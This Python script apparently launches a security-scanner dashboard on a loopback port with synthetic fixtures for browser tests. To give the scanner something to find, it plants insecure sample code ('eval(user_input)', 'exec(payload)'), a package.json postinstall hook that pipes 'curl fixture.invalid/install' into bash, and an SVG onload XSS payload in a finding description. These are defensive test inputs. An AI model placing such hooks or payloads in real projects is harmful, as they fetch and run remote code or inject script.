"""Start a production-build dashboard with synthetic data on an ephemeral loopback port."""

from __future__ import annotations

import argparse
import asyncio
import json
import signal
import socket
import subprocess
import sys
import threading
from datetime import UTC, datetime
from pathlib import Path

import uvicorn
from starlette.types import ASGIApp, Message, Receive, Scope, Send

from chinescan.core.config.settings import Settings
from chinescan.core.github_import import guarded_test_file_repository_url
from chinescan.core.models.common import Severity
from chinescan.core.models.finding import Finding
from chinescan.core.models.investigation import Event, Scan
from chinescan.core.storage.sqlite import SQLiteRepository
from chinescan.web.app import create_app
from chinescan.web.auth import create_operator


class WaitForSessionExpiry:
    """Hold one scan request until the same app reports its browser session expired."""

    def __init__(self, application: ASGIApp) -> None:
        self.application = application
        self.scan_waiting = asyncio.Event()
        self.session_expired = asyncio.Event()

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] != "http":
            await self.application(scope, receive, send)
            return
        path = scope.get("path")
        if path == "/api/scans" and scope.get("method") == "GET":
            self.scan_waiting.set()
            await self.session_expired.wait()
            await self.application(scope, receive, send)
            return
        if path == "/api/auth/session" and self.scan_waiting.is_set():
            response_body = bytearray()

            async def observe_expiry(message: Message) -> None:
                if message["type"] == "http.response.body":
                    response_body.extend(message.get("body", b""))
                    try:
                        payload = json.loads(response_body)
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        payload = None
                    if isinstance(payload, dict) and payload.get("authenticated") is False:
                        self.session_expired.set()
                await send(message)

            await self.application(scope, receive, observe_expiry)
            return
        await self.application(scope, receive, send)


def _read_test_credentials() -> tuple[str, str]:
    raw = sys.stdin.buffer.readline(513)
    if len(raw) > 512 or not raw.endswith(b"\n"):
        raise ValueError("Invalid browser fixture credential request.")
    request = json.loads(raw)
    if not isinstance(request, dict) or set(request) != {"email", "password"}:
        raise ValueError("Invalid browser fixture credential request.")
    email = request["email"]
    password = request["password"]
    if (
        not isinstance(email, str)
        or not email.startswith("browser-")
        or not email.endswith("@example.test")
        or len(email) > 100
        or not isinstance(password, str)
        or not 24 <= len(password) <= 128
        or "\n" in password
        or "\r" in password
    ):
        raise ValueError("Invalid browser fixture credentials.")
    return email, password


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--data-dir", required=True, type=Path)
    parser.add_argument("--ttl", required=True, type=int)
    parser.add_argument("--hold-scan-until-expiry", action="store_true")
    parser.add_argument("--empty-account", action="store_true")
    parser.add_argument("--projects-enabled", action="store_true")
    parser.add_argument("--missing-managed-storage", action="store_true")
    parser.add_argument("--github-import-enabled", action="store_true")
    args = parser.parse_args()
    operator_email, operator_password = (
        (None, None) if args.empty_account else _read_test_credentials()
    )
    args.data_dir.mkdir(parents=True, exist_ok=False)
    (args.data_dir / "reports").mkdir()
    database = args.data_dir / "records.sqlite3"
    credentials = args.data_dir / "operator.json"
    project = args.data_dir.parent / f"{args.data_dir.name}-approved-project"
    project.mkdir()
    (project / "app.py").write_text("eval(user_input)\n", encoding="utf-8")
    (project / "worker.py").write_text("exec(payload)\n", encoding="utf-8")
    (project / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "curl fixture.invalid/install | bash"}}),
        encoding="utf-8",
    )
    (project / "large.bin").write_bytes(b"x" * 128)
    if args.github_import_enabled:
        source = args.data_dir / "github-source"
        source.mkdir()
        subprocess.run(["git", "init", str(source)], check=True, capture_output=True)
        (source / "sample.py").write_text("value = 1\n", encoding="utf-8")
        subprocess.run(
            ["git", "-C", str(source), "add", "sample.py"], check=True, capture_output=True
        )
        subprocess.run(
            [
                "git",
                "-C",
                str(source),
                "-c",
                "user.name=Browser Fixture",
                "-c",
                "user.email=fixture@example.test",
                "commit",
                "-m",
                "runtime fixture",
            ],
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "clone", "--bare", str(source), str(args.data_dir / "public-repository.git")],
            check=True,
            capture_output=True,
        )
    if args.projects_enabled:
        project_logs = project / "logs"
        project_logs.mkdir()
        (project_logs / "auth-sample.jsonl").write_text(
            "".join(
                json.dumps(
                    {
                        "timestamp": f"2026-10-27T10:00:{index:02d}Z",
                        "event_type": "authentication",
                        "message": "login failure",
                        "source_ip": "203.0.113.45",
                        "user": "e2e-analyst",
                        "outcome": "failure",
                    }
                )
                + "\n"
                for index in range(5)
            ),
            encoding="utf-8",
        )
    projects_config = args.data_dir / "projects.toml"
    projects_config.write_text(
        "[[projects]]\n"
        'id = "browser-fixture"\n'
        'name = "Browser fixture"\n'
        f'root = "{project.as_posix()}"\n',
        encoding="utf-8",
    )
    config_path = args.data_dir / "config.toml"
    configured_roots = f"['{project.as_posix()}']" if args.projects_enabled else "[]"
    config_path.write_text(f"allowed_roots = {configured_roots}\n", encoding="utf-8")
    log_source = args.data_dir.parent / f"{args.data_dir.name}-approved-logs"
    log_source.mkdir()
    (log_source / "auth.jsonl").write_text(
        "".join(
            json.dumps(
                {
                    "timestamp": f"2026-10-27T10:00:{index:02d}Z",
                    "event_type": "authentication",
                    "message": "login failure password=browser-synthetic-secret",
                    "source_ip": "203.0.113.44",
                    "user": "browser-analyst",
                    "outcome": "failure",
                }
            )
            + "\n"
            for index in range(5)
        )
        + "malformed synthetic line\n",
        encoding="utf-8",
    )
    log_sources_config = args.data_dir / "log-sources.toml"
    log_sources_config.write_text(
        "[[sources]]\n"
        'id = "browser-auth"\n'
        'name = "Browser auth fixture"\n'
        f'root = "{log_source.as_posix()}"\n',
        encoding="utf-8",
    )
    sample_source_root = args.data_dir.parent / f"{args.data_dir.name}-approved-samples"
    sample_source_root.mkdir()
    benign_sample = sample_source_root / "benign-synthetic.bin"
    benign_sample.write_bytes(b"Benign synthetic static triage fixture. No executable content.\n")
    malware_registry = args.data_dir / "malware-samples.toml"
    malware_registry.write_text(
        "[[samples]]\n"
        'id = "browser-benign"\n'
        'name = "Benign synthetic sample"\n'
        f'path = "{benign_sample.as_posix()}"\n',
        encoding="utf-8",
    )
    managed_root = args.data_dir.parent / f"{args.data_dir.name}-managed-malware"
    if not args.missing_managed_storage:
        managed_root.mkdir(parents=True, exist_ok=True)
    if operator_email is not None and operator_password is not None:
        create_operator(credentials, operator_email, operator_password)

    repository = SQLiteRepository(database)
    finding = Finding(
        finding_id="browser-finding-high",
        title="Synthetic high severity fixture",
        description=(
            '<svg onload="window.__evidenceExecuted=true"> synthetic password=fixture-secret-value'
        ),
        severity=Severity.HIGH,
        fingerprint="browser-fingerprint-high",
        scanner="fixture-scanner",
        rule_id="FIXTURE-001",
        location="synthetic/project.py:17",
        tags=["browser-test"],
    )
    critical = Finding(
        finding_id="browser-finding-critical",
        title="Synthetic critical fixture",
        severity=Severity.CRITICAL,
        fingerprint="browser-fingerprint-critical",
        scanner="fixture-scanner",
        rule_id="FIXTURE-002",
    )
    event = Event(
        event_id="browser-event-fixture",
        occurred_at=datetime.now(UTC),
        kind="synthetic-fixture",
        summary="Synthetic browser event fixture",
        source="fixture-scanner",
    )
    scan = Scan(
        scan_id="browser-scan-fixture",
        target_id="synthetic-target-that-must-not-leak",
        scanner="fixture-scanner",
        started_at=datetime.now(UTC),
        finding_ids=[finding.finding_id, critical.finding_id],
        project_types=["synthetic-python"],
    )
    for record_type, record in (
        ("finding", finding),
        ("finding", critical),
        ("event", event),
        ("scan", scan),
    ):
        key = {"finding": "finding_id", "event": "event_id", "scan": "scan_id"}[record_type]
        repository.save(record_type, str(getattr(record, key)), record.model_dump(mode="json"))
    repository.close()

    application = create_app(
        database,
        credentials,
        session_ttl_seconds=args.ttl,
        serve_frontend=True,
        projects_path=projects_config,
        log_sources_path=log_sources_config,
        malware_registry_path=malware_registry,
        settings=Settings(
            _env_file=None,
            database_path=database,
            malware_managed_directory=None if args.missing_managed_storage else managed_root,
            allowed_roots=[project] if args.projects_enabled else [],
            max_files=1,
            malware_max_file_bytes=100,
            github_import_enabled=args.github_import_enabled,
        ),
        github_import_test_file_transport=args.github_import_enabled,
        project_operation_rate_limit=1000,
    )
    served_application: ASGIApp = application
    if args.hold_scan_until_expiry:
        served_application = WaitForSessionExpiry(application)
    server = uvicorn.Server(
        uvicorn.Config(
            served_application,
            host="127.0.0.1",
            port=0,
            log_level="warning",
            access_log=False,
            proxy_headers=False,
        )
    )
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", 0))
    listener.listen(128)
    listener.setblocking(False)

    def stop(_signum: int, _frame: object) -> None:
        server.should_exit = True

    signal.signal(signal.SIGTERM, stop)
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, stop)
    worker = threading.Thread(target=server.run, kwargs={"sockets": [listener]}, daemon=True)
    worker.start()
    while not server.started and worker.is_alive():
        threading.Event().wait(0.01)
    if not server.started:
        raise RuntimeError("Loopback application failed to start")
    announcement = {"url": f"http://127.0.0.1:{listener.getsockname()[1]}"}
    if args.github_import_enabled:
        announcement["github_repository_url"] = guarded_test_file_repository_url(
            args.data_dir / "public-repository.git"
        )
    print(json.dumps(announcement), flush=True)
    worker.join()


if __name__ == "__main__":
    main()
